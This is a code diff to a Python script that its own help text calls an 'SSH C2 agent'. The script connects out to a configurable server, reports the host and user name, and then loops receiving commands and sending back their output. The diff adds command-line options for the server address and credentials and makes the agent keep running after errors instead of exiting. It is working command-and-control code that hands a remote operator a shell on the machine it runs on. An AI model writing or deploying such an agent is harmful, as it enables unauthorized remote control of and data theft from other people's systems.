@@ -2,17 +2,31 @@ import paramiko
 import subprocess
 import sys
 import os
-import shlex
 import socket
 import getpass
+import argparse
+#import shlex
+
+parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
+parser._action_groups.pop()
+required = parser.add_argument_group('Required')
+optional = parser.add_argument_group('Optional')
+required.add_argument("-ip", dest="ip", help="Server IP")
+optional.add_argument("-p", dest="port", type=int, default=2222, help="Server port (Default: 2222)")
+optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
+optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")
+
+if (len(sys.argv) == 1):
+    parser.print_help(sys.stderr)
+    sys.exit()
+
+args = parser.parse_args()
 
 def SSH_comm():
-    #ip = str(sys.argv[1:])
-    ip = '192.168.8.101' #Server IP
-    port = 2222
-    username = 'sshuser' #Server username
-    password = 'sshpass' #Server password
-    #print(ip)
+    ip = args.ip #Server IP
+    port = args.port #Server port
+    username = args.user #Server username
+    password = args.password #Server password
     try:
         SSH = paramiko.SSHClient()
         SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -21,12 +35,12 @@ def SSH_comm():
         host = socket.gethostname()
         user = getpass.getuser()
     except Exception as ex:
-        print('Error, possible invalid sever IP.\nEx: agent.py 127.0.0.1\nDebug info: ' + str(ex))
+        print('Error, possible invalid sever details. Use -h for help.')
+        #print('Debug info:\n' + str(ex))
         sys.exit()
-        
 
     if start_session.active:
-        start_session.send(f'Agent checked in from \'{host}\' as \'{user}\'.\n')
+        start_session.send(f'Agent checked in from \"{host}\" as \"{user}\".\n')
         print(start_session.recv(1024).decode())
         while True:
             incoming = start_session.recv(1024)
@@ -46,7 +60,7 @@ def SSH_comm():
                     start_session.send(command_out)
             except Exception as ex:
                 start_session.send(str(ex) + '\n')
-                sys.exit()
+                pass
             except KeyboardInterrupt:
                 start_session.send("Session interrupted.\n")
                 sys.exit()
